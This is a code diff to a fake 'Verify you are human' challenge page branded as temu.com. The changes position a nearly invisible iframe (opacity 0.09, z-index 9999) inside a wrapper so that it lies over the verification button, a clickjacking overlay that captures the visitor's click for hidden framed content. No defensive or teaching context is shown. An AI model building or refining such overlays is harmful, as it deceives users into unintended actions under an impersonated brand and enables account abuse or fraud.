@@ -510,7 +510,9 @@
     <div class="main-content">
       <h1 class="zone-name-title h1">temu.com</h1>
       <p id="LLeF5" class="h2 spacer-bottom">Verify you are human by completing the action below.</p>
-      <button class="ctp-button" id="verify-button">Verify you are human</button>
+      <div id="button-wrapper" style="position: relative; display: inline-block; margin: 2rem 0;">
+        <button class="ctp-button" id="verify-button" style="margin: 0;">Verify you are human</button>
+      </div>
       <div id="spinner" class="spacer loading-spinner" style="display: none; visibility: hidden">
         <div class="lds-ring">
           <div></div>
@@ -533,7 +535,7 @@
 
         iframe.style.width = width + 'px';
         iframe.style.height = height + 'px';
-        iframe.style.position = 'fixed';
+        iframe.style.position = 'absolute';
         iframe.style.zIndex = '9999';
         iframe.style.left = '-90px';
         iframe.style.top = '20px';
@@ -541,8 +543,8 @@
         // Opacity for debugging
         iframe.style.opacity = '0.09';
 
-        // 3. Add to body
-        document.body.appendChild(iframe);
+        // 3. Add to wrapper instead of body
+        document.getElementById('button-wrapper').appendChild(iframe);
 
         const code = "COyPK7sRq7S6St1eL36D19ba37a770e165965157cdd03aa7e7b3d9e4fc1ae96f64b6dc8ce2f";
 
